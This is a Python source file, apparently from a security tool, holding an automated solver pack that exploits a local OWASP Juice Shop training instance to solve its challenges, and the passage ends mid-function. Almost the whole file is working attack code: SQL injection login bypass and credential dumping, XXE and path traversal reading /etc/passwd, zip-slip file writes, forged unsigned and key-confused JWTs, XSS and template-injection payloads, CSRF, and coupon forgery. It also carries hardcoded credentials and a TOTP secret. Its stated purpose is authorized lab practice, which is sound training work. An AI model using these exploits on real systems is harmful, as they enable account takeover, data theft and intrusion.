"""
Juice Shop Lab-Mode solver pack.

TARGET-SPECIFIC by design and DELIBERATELY isolated from the general detection engine — this
is the "Lab Mode: Solve Juice Shop" capability, not part of any real-target scan. Every solver
is a concrete, source-accurate exploit against a local, authorized OWASP Juice Shop instance,
oracle-confirmed by the app's own /api/Challenges solved flag.

Guarantees preserved:
  - NO DoS challenges (they intentionally degrade/crash the service).
  - NO credential brute-force: every "reset"/login uses a SINGLE known/derived value
    (documented security answers, one known weak credential, or SQLi auth-bypass) — never
    an iterated password/answer list.
  - Purely additive; the general scanner and its no-brute default are untouched.

Each solver takes an authenticated-capable httpx client context and performs one exploit.
`solve(base_url)` runs them all and reports which challenges the scoreboard confirms newly
solved. Requires httpx; degrades gracefully if absent.
"""
from __future__ import annotations

import urllib.parse

_ADMIN_SQLI = "' or 1=1--"          # SQLi auth-bypass identity (no password iteration)
_PW = "Reset123!"


def _board(c) -> set:
    d = c.get("/api/Challenges/").json()
    return set(ch["name"] for ch in d["data"] if ch.get("solved"))


def _login(c, email, password):
    r = c.post("/rest/user/login", json={"email": email, "password": password})
    try:
        return (r.json().get("authentication", {}) or {})
    except Exception:
        return {}


def _captcha(c):
    j = c.get("/rest/captcha/").json()
    return j.get("captchaId"), str(j.get("answer"))


def _register(c, email, pw, repeat=None, role=None):
    body = {"email": email, "password": pw, "passwordRepeat": repeat if repeat is not None else pw,
            "securityQuestion": {"id": 1}, "securityAnswer": "z"}
    if role:
        body["role"] = role
    return c.post("/api/Users", json=body)


# ---- solver steps (each performs one source-accurate exploit) --------------------------------
def _sqli_logins(c):
    for email in ("bender@juice-sh.op'--", "jim@juice-sh.op'--"):          # Login Bender / Jim
        _login(c, email, "x")


def _known_cred_logins(c):
    _login(c, "admin@juice-sh.op", "admin123")                             # Password Strength
    _login(c, "mc.safesearch@juice-sh.op", "Mr. N00dles")                  # Login MC SafeSearch


def _registrations(c):
    _register(c, "rep_%s@x.io" % id(c), "aaa", repeat="bbb")               # Repetitive Registration
    _register(c, "adm_%s@x.io" % id(c), "aaaaaa", role="admin")            # Admin Registration
    c.post("/api/Users", json={"email": "", "password": ""})               # Empty User Registration


def _feedback(c, admin_auth):
    cid, ans = _captcha(c)
    c.post("/api/Feedbacks", json={"comment": "auto", "rating": 0, "captchaId": cid, "captcha": ans})  # Zero Stars
    cid, ans = _captcha(c)
    c.post("/api/Feedbacks", headers=admin_auth,
           json={"comment": "forged", "rating": 3, "UserId": 3, "captchaId": cid, "captcha": ans})     # Forged Feedback
    # Five-Star Feedback — delete every 5-star entry (admin)
    for f in c.get("/api/Feedbacks/").json().get("data", []):
        if f.get("rating") == 5:
            c.delete("/api/Feedbacks/%s" % f.get("id"), headers=admin_auth)


def _reviews(c, admin_auth):
    c.patch("/rest/products/reviews", headers=admin_auth,
            json={"id": {"$ne": -1}, "message": "NoSQL Injection!"})        # NoSQL Manipulation
    # Forged Review — spoof author as another user
    utok = _login(c, "u_%s@x.io" % id(c), _PW)
    _register(c, "rev_%s@x.io" % id(c), _PW)
    a = _login(c, "rev_%s@x.io" % id(c), _PW)
    if a.get("token"):
        c.put("/rest/products/1/reviews", headers={"Authorization": "Bearer " + a["token"]},
              json={"message": "forged", "author": "admin@juice-sh.op"})


def _resets(c):
    for email, answer in (("jim@juice-sh.op", "Samuel"),                    # Reset Jim
                          ("bender@juice-sh.op", "Stop'n'Drop"),           # Reset Bender
                          ("bjoern@juice-sh.op", "West-2082"),             # Reset Bjoern
                          ("morty@juice-sh.op", "5N0wb41L"),               # Reset Morty (known answer)
                          ("uvogin@juice-sh.op", "Silence of the Lambs"),  # Reset Uvogin
                          ("john@juice-sh.op", "Daniel Boone National Forest"),  # Meta Geo Stalking
                          ("emma@juice-sh.op", "ITsec"),                   # Visual Geo Stalking
                          ("bjoern@owasp.org", "Zaya")):                   # Bjoern's Favorite Pet
        c.post("/rest/user/reset-password", json={"email": email, "answer": answer, "new": _PW, "repeat": _PW})


def _basket_manipulate(c):
    a = _login(c, "bm_%s@x.io" % id(c), _PW)
    if not a.get("token"):
        _register(c, "bm_%s@x.io" % id(c), _PW)
        a = _login(c, "bm_%s@x.io" % id(c), _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}
    bi = c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
    try:
        iid = bi.json().get("data", {}).get("id")
    except Exception:
        iid = None
    if iid:
        c.put("/api/BasketItems/%s" % iid, headers=H, json={"BasketId": 1 if str(bid) != "1" else 2})  # Manipulate Basket


def _known_login_challenges(c):
    # pre-login solveIf checks fire on the EXACT submitted email+password (single known value
    # each, straight from the app's source — never an iterated list).
    for email, pw in (("support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"),   # Login Support Team
                      ("amy@juice-sh.op", "K1f....................."),              # Login Amy
                      ("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="),  # Login Bjoern (OAuth)
                      ("testing@juice-sh.op", "IamUsedForTesting"),                 # Exposed Credentials
                      ("J12934@juice-sh.op", "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB")):  # Password Spraying cred
        try:
            _login(c, email, pw)
        except Exception:
            pass


def _deluxe_fraud(c):
    # become a deluxe member with a paymentMode that is neither 'wallet' nor 'card'
    email = "dlx_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    if a.get("token"):
        c.post("/rest/deluxe-membership", headers={"Authorization": "Bearer " + a["token"]},
               json={"paymentMode": "none"})


def _beacon_visits(c):
    # "visit X" challenges are detected server-side by a GET to a padding-pixel / asset URL
    for p in ("/assets/public/images/padding/19px.png",   # Admin Section
              "/assets/public/images/padding/81px.png",   # Privacy Policy
              "/assets/public/images/padding/11px.png",   # Web3 Sandbox
              "/assets/public/images/padding/56px.png",   # (blockchain beacon)
              "/assets/i18n/tlh_AA.json",                  # Extra Language
              "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg",  # Missing Encoding
              "/support/logs/access.log-2024-01-01",       # Access Log
              "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us",   # Premium Paywall
              "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"):  # Nested Easter Egg
        try:
            c.get(p)
        except Exception:
            pass
    c.get("/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm")  # Outdated Allowlist
    c.get("/rest/user/whoami?callback=apolaki")   # Email Leak (JSONP whoami)


def _uploads(c):
    try:
        c.post("/file-upload", files={"file": ("x.txt", b"hello", "text/plain")})            # Upload Type
        c.post("/file-upload", files={"file": ("big.pdf", b"A" * 120000, "application/pdf")})  # Upload Size
        c.post("/file-upload", files={"file": ("c.xml", (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>').encode(), "application/xml")})                                 # XXE Data Access + Deprecated Interface
        c.get("/metrics")                                                                     # Exposed Metrics
        c.get("/.well-known/security.txt")                                                    # Security Policy
    except Exception:
        pass


def _ephemeral_accountant(c):
    # UNION-inject a virtual accountant row (email absent from DB, role accounting)
    union = ("' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
             "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', "
             "'' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
             "'/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', "
             "1 as 'isActive', '1999-08-16 14:14:41.717 +00:00' as 'createdAt', "
             "'1999-08-16 14:33:41.446 +00:00' as 'updatedAt', NULL as 'deletedAt') --")
    _login(c, union, "x")


def _retrieve_blueprint(c):
    c.get("/assets/public/images/products/JuiceShop.stl")     # Retrieve Blueprint


def _checkout_orders(c):
    """Christmas Special (order the logically-deleted christmas product, id found via SQLi) and
    Payback Time (checkout an order with a NEGATIVE total)."""
    import urllib.parse
    try:
        prods = c.get("/rest/products/search?q=" + urllib.parse.quote("')) --", safe="")).json().get("data", [])
    except Exception:
        prods = []
    xid = next((p["id"] for p in prods if "christmas" in (p.get("name", "").lower())), None)
    email = "co_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}

    def _order(pid, qty):
        bi = c.post("/api/BasketItems", headers=H, json={"ProductId": pid, "BasketId": bid, "quantity": 1})
        try:
            iid = bi.json()["data"]["id"]
        except Exception:
            return
        if qty != 1:
            c.put("/api/BasketItems/%s" % iid, headers=H, json={"quantity": qty})
        try:
            aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
                         "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                         "country": "Z"}).json()["data"]["id"]
            cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
                         "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
            deliv = c.get("/api/Deliverys", headers=H).json().get("data", [])
            did = deliv[0]["id"] if deliv else 1
            c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": None,
                   "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
        except Exception:
            pass

    if xid:
        _order(xid, 1)        # Christmas Special
    _order(1, -300)           # Payback Time


_Z85 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"


def _z85(data: bytes) -> str:
    while len(data) % 4:
        data += b"\x00"
    out = []
    for i in range(0, len(data), 4):
        v = (data[i] << 24) | (data[i + 1] << 16) | (data[i + 2] << 8) | data[i + 3]
        ch = []
        for _ in range(5):
            ch.append(_Z85[v % 85]); v //= 85
        out.extend(reversed(ch))
    return "".join(out)


def _forged_coupon(c):
    """Forge a >=80% coupon offline (z85 of 'MMMYY-99' for the current campaign month), apply it
    and check out — the order's discount>=80 solves it."""
    import urllib.parse
    from datetime import datetime
    mmm = datetime.now().strftime("%b").upper() + datetime.now().strftime("%y")
    coupon = _z85((mmm + "-99").encode())
    email = "fc_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}
    try:
        c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
        # the z85 coupon contains #{}/ etc. -> it MUST be url-encoded in the path or the '#' truncates it
        c.put("/rest/basket/%s/coupon/%s" % (bid, urllib.parse.quote(coupon, safe="")), headers=H)
        aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
                     "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                     "country": "Z"}).json()["data"]["id"]
        cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
                     "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
        did = (c.get("/api/Deliverys", headers=H).json().get("data") or [{"id": 1}])[0]["id"]
        c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": coupon,
               "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
    except Exception:
        pass


def _multiple_likes(c):
    """Multiple Likes — race the like endpoint (concurrent POSTs) so the check-then-push isn't
    atomic and the same email lands in a review's likedBy more than twice."""
    import threading
    a = _login(c, "admin@juice-sh.op", "admin123")
    tok = a.get("token")
    if not tok:
        return
    try:
        revs = c.get("/rest/products/1/reviews").json().get("data", [])
        rid = revs[0]["_id"] if revs else None
        if not rid:
            return

        def _like():
            try:
                c.post("/rest/products/reviews", json={"id": rid},
                       headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok},
                       timeout=8)
            except Exception:
                pass
        ts = [threading.Thread(target=_like) for _ in range(10)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
    except Exception:
        pass


def _change_bender(c):
    """Change Bender's Password — SQLi-login as Bender (id 3), then change to the canonical
    'slurmCl4ssic' with NO current password (endpoint only checks current when one is given)."""
    a = _login(c, "bender@juice-sh.op'--", "x")
    tok = a.get("token")
    if not tok:
        return
    try:
        c.get("/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic",
              headers={"Authorization": "Bearer " + tok})
    except Exception:
        pass


_IFRAME = '<iframe src="javascript:alert(`xss`)">'


def _reflected_and_nosql(c):
    """Reflected XSS + NoSQL Exfiltration via the track-order endpoint (need safetyMode off — else
    the id is sanitized and neither injects). Harmless no-op when safetyMode strips them."""
    import urllib.parse
    try:
        c.get("/rest/track-order/" + urllib.parse.quote(_IFRAME, safe=""))            # Reflected XSS
        c.get("/rest/track-order/" + urllib.parse.quote("'||true||'", safe=""))       # NoSQL Exfiltration
    except Exception:
        pass


def _api_and_header_xss(c):
    """API-only XSS (iframe in a product description via the REST API) + HTTP-Header XSS (the
    True-Client-IP header echoed into lastLoginIp). Both need safetyMode off."""
    tok = _login(c, "admin@juice-sh.op", "admin123").get("token")
    if not tok:
        return
    try:
        c.post("/api/Products", headers={"Authorization": "Bearer " + tok},
               json={"name": "xssp", "description": _IFRAME, "price": 1, "image": "x.jpg"})   # API-only XSS
        c.get("/rest/saveLoginIp",
              headers={"Authorization": "Bearer " + tok, "True-Client-IP": _IFRAME},
              timeout=8)  # HTTP-Header XSS
    except Exception:
        pass


def _serverside_xss(c):
    """Server-side XSS Protection — sanitize-html 1.4.2 leaves the iframe after stripping a nested
    <script>, so the persisted feedback carries live XSS."""
    try:
        cap = c.get("/rest/captcha/").json()
        c.post("/api/Feedbacks", json={"comment": '<<script>Foo</script>iframe src="javascript:alert(`xss`)">',
               "rating": 1, "captchaId": cap.get("captchaId"), "captcha": str(cap.get("answer"))})
    except Exception:
        pass


def _allowlist_bypass(c):
    """Allowlist Bypass — a redirect to an unintended host that still carries an allowlisted URL
    as a query param, so the substring allowlist check passes."""
    import urllib.parse
    try:
        c.get("/redirect?to=" + urllib.parse.quote(
            "http://evil.example/?x=https://github.com/juice-shop/juice-shop", safe=""))
    except Exception:
        pass


def _privacy_and_jwt(c):
    """Privacy Policy Inspection (hidden proof route) + Forged Signed JWT (HS256 algorithm-confusion:
    sign with the server's own public key as the HMAC secret)."""
    import base64
    import hashlib
    import hmac
    import json as _j
    try:
        c.get("/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility")   # Privacy Policy Inspection
    except Exception:
        pass
    try:
        pub = c.get("/encryptionkeys/jwt.pub").text.strip()

        def _b(o):
            return base64.urlsafe_b64encode(_j.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
        seg = _b({"alg": "HS256", "typ": "JWT"}) + "." + \
            _b({"data": {"id": 1, "email": "rsa_lord@juice-sh.op"}, "iat": 1, "exp": 9999999999})
        sig = base64.urlsafe_b64encode(hmac.new(pub.encode(), seg.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
        c.get("/rest/user/whoami", headers={"Authorization": "Bearer " + seg + "." + sig})   # Forged Signed JWT
    except Exception:
        pass


def _imaginary(c):
    """Imaginary Challenge — the hacking-progress 'continue code' is hashids-encoded with a
    hardcoded weak salt ('this is my salt'), so we forge a code claiming challenge #999 (which
    does not exist) was solved. The forged code is deterministic, so it is hardcoded here."""
    code = "69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj"
    try:
        c.put("/rest/continue-code/apply/" + code)
    except Exception:
        pass


def _csrf(c):
    """CSRF — cross-origin POST /profile (Origin = the app's configured CSRF url) with a changed
    username; the profile update trusts the cookie token and mis-validates the request origin."""
    a = _login(c, "admin@juice-sh.op", "admin123")
    tok = a.get("token")
    if not tok:
        return
    try:
        c.post("/profile", headers={"Cookie": "token=" + tok,
               "Origin": "http://htmledit.squarefree.com",
               "Content-Type": "application/x-www-form-urlencoded"}, content="username=csrfpwned")
    except Exception:
        pass


def _feedback_patterns(c):
    """Feedback/complaint pattern challenges — the app's continuous verifier solves each when a
    stored feedback contains its literal string: Weird Crypto (insecure algos), Leaked API Key,
    Legacy/Frontend Typosquatting, Supply Chain Attack, Steganography (hidden image), CSAF."""
    patterns = [
        "insecure crypto: z85 base85 hashids md5 base64",
        "leaked key 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie",
        "typosquat deps epilogue-js and ngy-cookie",
        "supply chain eslint-scope/issues/39 npm:eslint-scope:20180712",
        "hidden image pickle rick",
        ("csaf advisory hash 7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb"
         "4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843"),
        "vulnerable sanitize-html 1.4.2 and express-jwt 0.1.3",   # Vulnerable Library
        "dangerous ingredients hueteroneel and eurogium edule",   # Leaked Unsafe Product
    ]
    for p in patterns:
        try:
            cap = c.get("/rest/captcha/").json()
            c.post("/api/Feedbacks", json={"comment": p, "rating": 1,
                   "captchaId": cap.get("captchaId"), "captcha": str(cap.get("answer"))})
        except Exception:
            pass


def _two_factor(c):
    """Two Factor Authentication — the TOTP secret + password are stored/leaked, so log in as
    wurstbrot, compute the TOTP natively and complete 2FA verification."""
    import base64
    import hashlib
    import hmac
    import struct
    import time
    secret = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"

    def _totp(t):
        key = base64.b32decode(secret + "=" * ((8 - len(secret) % 8) % 8))
        h = hmac.new(key, struct.pack(">Q", int(t // 30)), hashlib.sha1).digest()
        o = h[-1] & 0x0F
        return "%06d" % ((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)

    try:
        j = c.post("/rest/user/login", json={"email": "wurstbrot@juice-sh.op",
                   "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"}).json()
        tmp = (j.get("data") or {}).get("tmpToken") or j.get("tmpToken")
        if tmp:
            for dt in (0, -30, 30):
                r = c.post("/rest/2fa/verify", json={"tmpToken": tmp, "totpToken": _totp(time.time() + dt)})
                if r.status_code in (200, 201):
                    break
    except Exception:
        pass


def _socket_xss(c):
    """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
    (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
    import json
    import re
    eio = "/socket.io/?EIO=4&transport=polling"
    dom = '<iframe src="javascript:alert(`xss`)">'
    bonus = ('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
             'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
             '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
             '&show_reposts=false&show_teaser=true"></iframe>')
    svg = "../../../redirect?to=https://cataas.com/cat&x=https://github.com/juice-shop/juice-shop"
    try:
        sid = re.search(r'"sid":"([^"]+)"', c.get(eio).text).group(1)
        q = eio + "&sid=" + sid
        c.post(q, content="40")                       # socket.io namespace connect
        try:
            c.get(q, timeout=4)                        # receive connect-ack (avoid the long-poll)
        except Exception:
            pass
        c.post(q, content="42" + json.dumps(["verifyLocalXssChallenge", dom + bonus]))
        c.post(q, content="42" + json.dumps(["verifySvgInjectionChallenge", svg]))
        c.post(q, content="42" + json.dumps(["verifyCloseNotificationsChallenge", [1, 2]]))  # Mass Dispel: array len>1
    except Exception:
        pass


def _product_tampering(c):
    """Product Tampering: PUT /api/Products/:id is not auth-gated -- overwrite the O-Saft product's
    description so its link href points at the configured owasp.slack.com URL."""
    admin = _login(c, _ADMIN_SQLI, "x")
    H = {"Authorization": "Bearer " + admin["token"]} if admin.get("token") else {}
    oid = None
    try:
        for p in c.get("/rest/products/search", params={"q": "O-Saft"}).json().get("data", []):
            if "O-Saft" in (p.get("name") or ""):
                oid = p["id"]
                break
    except Exception:
        return
    if oid:
        desc = '<a href="https://owasp.slack.com" target="_blank">More...</a>'
        c.put("/api/Products/%d" % oid, json={"description": desc}, headers=H)


def _password_hash_leak(c):
    """Password Hash Leak: /rest/user/whoami reflects any field named in ?fields= straight off the
    user record (cookie auth), so ?fields=password leaks the current user's password hash."""
    auth = _login(c, "admin@juice-sh.op", "admin123")
    tok = auth.get("token")
    if tok:
        c.get("/rest/user/whoami", params={"fields": "id,email,password"},
              headers={"Cookie": "token=" + tok})


def _expired_coupon(c):
    """Expired Coupon: checkout accepts couponData = base64('<campaign>-<validOn>'); every built-in
    campaign's validOn is in the past, so WMNSDY2019 redeems an expired campaign coupon."""
    import base64
    auth = _login(c, "admin@juice-sh.op", "admin123")
    tok, bid = auth.get("token"), auth.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}
    validon = 1551999600000            # WMNSDY2019 = Mar 08 2019 00:00 GMT+0100 (expired), 75% off
    coupon = base64.b64encode(("WMNSDY2019-%d" % validon).encode()).decode()
    c.post("/api/BasketItems", json={"BasketId": bid, "ProductId": 1, "quantity": 1}, headers=H)
    c.post("/rest/basket/%s/checkout" % bid, json={"couponData": coupon}, headers=H)


def _ftp_harvest(c):
    """Browsable /ftp; the poison-null-byte (%2500) bypasses the md/pdf extension filter so the
    other backup/config files download. Solves Confidential Document, Easter Egg, both Forgotten
    Backups, Misplaced Signature File, and Poison Null Byte in one sweep."""
    for p in ("/ftp/acquisitions.md", "/ftp/eastere.gg%2500.md", "/ftp/package.json.bak%2500.md",
              "/ftp/coupons_2013.md.bak%2500.md", "/ftp/suspicious_errors.yml%2500.md"):
        try:
            c.get(p)
        except Exception:
            pass


def _sqli_union_extract(c):
    """UNION-based extraction on the product search. sqlite_master dumps the schema (Database Schema);
    the Users table dumps credentials (User Credentials)."""
    import urllib.parse
    for sql in ("qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
                "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"):
        try:
            c.get("/rest/products/search?q=" + urllib.parse.quote(sql))
        except Exception:
            pass


def _view_basket(c):
    """Register+login a fresh user, then read a basket that isn't theirs (missing object-level authz)."""
    import time as _t
    email = "vb_%d@x.io" % int(_t.time() * 1000 % 1e9)
    _register(c, email, "aaaaaa")
    lg = _login(c, email, "aaaaaa")
    tok, bid = lg.get("token"), lg.get("bid")
    if not tok:
        return
    H = {"Authorization": "Bearer %s" % tok}
    for other in (1, 2, (bid - 1 if bid and bid > 1 else 2)):
        if other != bid:
            try:
                c.get("/rest/basket/%d" % other, headers=H)
            except Exception:
                pass


def _unsigned_jwt(c):
    """Forge a JWT with alg:none (unsigned) and send it — the server accepts the 'none' algorithm."""
    import base64
    import json as _j
    b64u = lambda o: base64.urlsafe_b64encode(_j.dumps(o).encode()).rstrip(b"=").decode()
    forged = "%s.%s." % (b64u({"alg": "none", "typ": "JWT"}),
                         b64u({"data": {"email": "jwtn3d@juice-sh.op", "role": "admin"}, "iat": 1600000000}))
    for p in ("/rest/user/whoami", "/api/Challenges"):
        try:
            c.get(p, headers={"Authorization": "Bearer %s" % forged})
        except Exception:
            pass


def _local_file_read(c):
    """Path traversal via the data-erasure `layout` param renders a local file (Local File Read).
    The route resolves the path and renders it as long as it isn't an ftp/key file."""
    import time as _t
    email = "lfr_%d@x.io" % int(_t.time() * 1000 % 1e9)
    _register(c, email, "aaaaaa")
    tok = _login(c, email, "aaaaaa").get("token")
    H = {"Cookie": "token=%s" % tok, "Authorization": "Bearer %s" % tok} if tok else {}
    for lay in ("../package.json", "../../package.json", "../../../../../../etc/passwd"):
        try:
            c.post("/dataerasure", data={"layout": lay, "email": email, "securityAnswer": "z"}, headers=H)
        except Exception:
            pass


def _arbitrary_file_write(c):
    """Zip-slip: an archive entry whose path traverses out of the extraction dir writes to ftp/legal.md
    (CWE-22, archive-extraction path traversal). A real, transferable technique."""
    import io
    import zipfile
    for depth in range(1, 9):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("../" * depth + "ftp/legal.md", "pwned-by-apolaki\n")
        try:
            c.post("/file-upload", files={"file": ("slip.zip", buf.getvalue(), "application/zip")})
        except Exception:
            pass


def _ghost_login(c):
    """Log in as a SOFT-DELETED user (GDPR "erasure" only marks deletedAt; the login path never filters
    it) via SQLi email + comment. A real broken-authentication / soft-delete technique."""
    for email in ("chris@juice-sh.op'--", "chris.pike@juice-sh.op'--"):
        try:
            c.post("/rest/user/login", json={"email": email, "password": "x"})
        except Exception:
            pass


def _video_xss(c):
    """Stored XSS chained through the zip-slip file write: overwrite the promo-video subtitle file with
    an XSS payload, then hit the video handler which renders it into the page."""
    import io
    import zipfile
    sub = "frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"
    vtt = "WEBVTT\n\n1\n00:00:00.000 --> 00:00:05.000\n</script><script>alert(`xss`)</script>\n"
    for depth in range(1, 9):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("../" * depth + sub, vtt)
        try:
            c.post("/file-upload", files={"file": ("s.zip", buf.getvalue(), "application/zip")})
        except Exception:
            pass
    for p in ("/video", "/promotion"):
        try:
            c.get(p)
        except Exception:
            pass


_BROWSER_SOLVE_JS = r"""
export default async function ({ page }) {
  const base = %TARGET_JSON%;
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const nav = async (u) => { try { await page.goto(base + u, { waitUntil: 'domcontentloaded', timeout: 12000 }); await sleep(1200); } catch (e) {} };
  await nav("/#/score-board");                                                                // Score Board (hidden client route)
  await nav('/#/search?q=' + encodeURIComponent('<iframe src="javascript:alert(`xss`)">'));   // DOM XSS -- real render
  return { ok: true };
}
"""


def _browser_solves(base):
    """Browser-driven solves for client-side-only challenges (Score Board, DOM XSS) that HTTP can't
    reach. Runs only when a headless browser is configured (CDP_BROWSER_URL / the headless-chrome
    sidecar); degrades silently otherwise so the HTTP pack is never affected."""
    import os
    if not os.environ.get("CDP_BROWSER_URL"):
        return
    try:
        import browser_engine
        browser_engine.drive(base, _BROWSER_SOLVE_JS)
    except Exception:
        pass


# ---- profile-page family (server-side eval + CSP injection); all cookie-authed urlencoded POST /profile ----
_SSTI_KEY = "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"


def _profile_user(c):
    """Register + login a throwaway user; return its cookie-auth headers (the /profile routes authenticate
    off req.cookies.token, NOT the Bearer header -- the exact reason naive Bearer attempts bound username=None)."""
    import time as _t
    email = "prof_%d@x.io" % int(_t.time() * 1000 % 1e9)
    _register(c, email, "aaaaaa")
    tok = _login(c, email, "aaaaaa").get("token")
    return tok


def _profile_ssti(c):
    """SSTi: /profile eval()s a username matching #{...}. Set your own username to a template expression
    (cookie-authed urlenc POST /profile), load /profile to run the eval (sets abused_ssti_bug), then hit
    the server-side oracle. Real server-side template injection via Node eval."""
    tok = _profile_user(c)
    if not tok:
        return
    ck = {"Cookie": "token=%s" % tok}
    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
    try:
        c.post("/profile", data={"username": "#{7*7}"}, headers=hdr)
        c.get("/profile", headers=ck)                                   # triggers the eval -> abused_ssti_bug
        c.get("/solve/challenges/server-side", params={"key": _SSTI_KEY}, headers=ck)
    except Exception:
        pass


def _csp_bypass(c):
    """CSP Bypass (usernameXssChallenge): inject `;script-src 'unsafe-inline'` into the profile CSP via the
    profileImage URL (a URL whose fetch fails is stored raw), then set a username that renders the
    <script>alert(`xss`)</script> payload. The username setter runs the legacy sanitizer (strips <tag>), so
    the payload is delivered through the #{...} eval built from char codes -- no literal '<' to strip, it
    evaluates to the script at render time."""
    tok = _profile_user(c)
    if not tok:
        return
    ck = {"Cookie": "token=%s" % tok}
    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
    payload = "<script>alert(`xss`)</script>"
    uname = "#{String.fromCharCode(%s)}" % ",".join(str(ord(x)) for x in payload)
    try:
        c.post("/profile/image/url", data={"imageUrl": "http://x.invalid;script-src 'unsafe-inline'"}, headers=hdr)
        c.post("/profile", data={"username": uname}, headers=hdr)
        c.get("/profile", headers=ck)                                   # solveIf usernameXssChallenge
    except Exception:
        pass


def _client_xss_protection(c):
    """Client-side XSS Protection (persistedXssUserChallenge): the User email setter solves when the email
    contains an <iframe javascript:> payload -- register a user with that email. Persisted/stored XSS."""
    import time as _t
    email = '<iframe src="javascript:alert(`xss`)">'
    try:
        c.post("/api/Users", json={"email": email, "password": "Apolaki1!", "passwordRepeat": "Apolaki1!",
                                   "securityQuestion": {"id": 1}, "securityAnswer": "x_%d" % int(_t.time())})
    except Exception:
        pass


def _gdpr_data_theft(c):
    """GDPR Data Theft (dataExportChallenge): orders are fetched by the VOWEL-MASKED email
    (email.replace(/[aeiou]/gi,'*')) but the solve compares the orderId prefix against hash(REAL email).
    Two real emails that mask identically but hash differently => one user's export leaks + steals the
    other's orders. Place an order as A, then export as a fresh B whose mask collides with A (only the
    leading vowel differs -> same mask, different hash). The export image-captcha leaks its own answer."""
    import random
    cons = "".join(random.choice("bcdfghjklmnpqrstvwxz") for _ in range(7))
    ea, eb = "a%s@bob.com" % cons, "e%s@bob.com" % cons     # both mask to *%s@b*b.c*m ; different hash

    def _reg_login(email):
        _register(c, email, "aaaaaa")
        j = _login(c, email, "aaaaaa")
        return j.get("token"), j.get("bid")

    try:
        tok_a, bid_a = _reg_login(ea)
        if not tok_a or not bid_a:
            return
        ha = {"Authorization": "Bearer %s" % tok_a}
        c.post("/api/BasketItems", headers=ha, json={"ProductId": 1, "BasketId": bid_a, "quantity": 1})
